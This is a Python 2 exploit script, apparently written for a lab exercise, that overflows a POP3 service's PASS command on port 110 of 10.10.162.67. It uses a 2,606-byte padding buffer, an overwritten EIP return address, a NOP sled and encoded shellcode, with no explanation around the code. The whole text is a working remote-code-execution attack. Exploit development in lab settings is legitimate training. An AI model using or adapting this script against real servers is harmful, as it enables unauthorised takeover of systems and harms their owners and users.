import sys, socket

offset = 2606

crash = ("A" * offset)

eip = "\x8F\x35\x4A\x5F"

nops = ("\x90" * 16)

payload = ("\xd9\xf7\xd9\x74\x24\xf4\x58\xbb\xd7\xfe\x2a\x70\x33\xc9\xb1"
"\x52\x83\xe8\xfc\x31\x58\x13\x03\x8f\xed\xc8\x85\xd3\xfa\x8f"
"\x66\x2b\xfb\xef\xef\xce\xca\x2f\x8b\x9b\x7d\x80\xdf\xc9\x71"
"\x6b\x8d\xf9\x02\x19\x1a\x0e\xa2\x94\x7c\x21\x33\x84\xbd\x20"
"\xb7\xd7\x91\x82\x86\x17\xe4\xc3\xcf\x4a\x05\x91\x98\x01\xb8"
"\x05\xac\x5c\x01\xae\xfe\x71\x01\x53\xb6\x70\x20\xc2\xcc\x2a"
"\xe2\xe5\x01\x47\xab\xfd\x46\x62\x65\x76\xbc\x18\x74\x5e\x8c"
"\xe1\xdb\x9f\x20\x10\x25\xd8\x87\xcb\x50\x10\xf4\x76\x63\xe7"
"\x86\xac\xe6\xf3\x21\x26\x50\xdf\xd0\xeb\x07\x94\xdf\x40\x43"
"\xf2\xc3\x57\x80\x89\xf8\xdc\x27\x5d\x89\xa7\x03\x79\xd1\x7c"
"\x2d\xd8\xbf\xd3\x52\x3a\x60\x8b\xf6\x31\x8d\xd8\x8a\x18\xda"
"\x2d\xa7\xa2\x1a\x3a\xb0\xd1\x28\xe5\x6a\x7d\x01\x6e\xb5\x7a"
"\x66\x45\x01\x14\x99\x66\x72\x3d\x5e\x32\x22\x55\x77\x3b\xa9"
"\xa5\x78\xee\x7e\xf5\xd6\x41\x3f\xa5\x96\x31\xd7\xaf\x18\x6d"
"\xc7\xd0\xf2\x06\x62\x2b\x95\x22\x7a\x16\x1e\x5b\x7e\x58\xfe"
"\x40\xf7\xbe\x94\x66\x5e\x69\x01\x1e\xfb\xe1\xb0\xdf\xd1\x8c"
"\xf3\x54\xd6\x71\xbd\x9c\x93\x61\x2a\x6d\xee\xdb\xfd\x72\xc4"
"\x73\x61\xe0\x83\x83\xec\x19\x1c\xd4\xb9\xec\x55\xb0\x57\x56"
"\xcc\xa6\xa5\x0e\x37\x62\x72\xf3\xb6\x6b\xf7\x4f\x9d\x7b\xc1"
"\x50\x99\x2f\x9d\x06\x77\x99\x5b\xf1\x39\x73\x32\xae\x93\x13"
"\xc3\x9c\x23\x65\xcc\xc8\xd5\x89\x7d\xa5\xa3\xb6\xb2\x21\x24"
"\xcf\xae\xd1\xcb\x1a\x6b\xe1\x81\x06\xda\x6a\x4c\xd3\x5e\xf7"
"\x6f\x0e\x9c\x0e\xec\xba\x5d\xf5\xec\xcf\x58\xb1\xaa\x3c\x11"
"\xaa\x5e\x42\x86\xcb\x4a")

buff = crash + eip + nops + payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.10.162.67', 110))
data = s.recv(1024)
s.send('USER username' +'\r\n')
data = s.recv(1024)
s.send('PASS ' + buff + '\r\n')
data = s.recv(1024)
s.close()
